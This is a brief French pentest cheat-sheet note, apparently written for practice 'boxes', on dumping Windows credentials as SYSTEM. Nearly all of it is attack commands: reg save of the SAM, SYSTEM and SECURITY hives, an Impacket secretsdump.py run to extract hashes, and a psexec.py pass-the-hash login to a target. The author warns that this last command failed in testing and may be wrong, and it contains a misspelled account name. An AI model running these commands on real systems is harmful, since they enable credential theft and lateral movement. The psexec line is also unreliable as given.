---
public: true # set to true to make the article publishable
---

## Sauvegarde des credentials quand on est system
```shell
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
```

```
secretdump.py local -sam sam.save -security security.save -system system.save LOCAL
```

``` shell 
# ATTENTION, je n'ai pas réussi à le faire fonctionner sur les boxes où je l'ai testé la commande pourraît être erronnée
psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx
```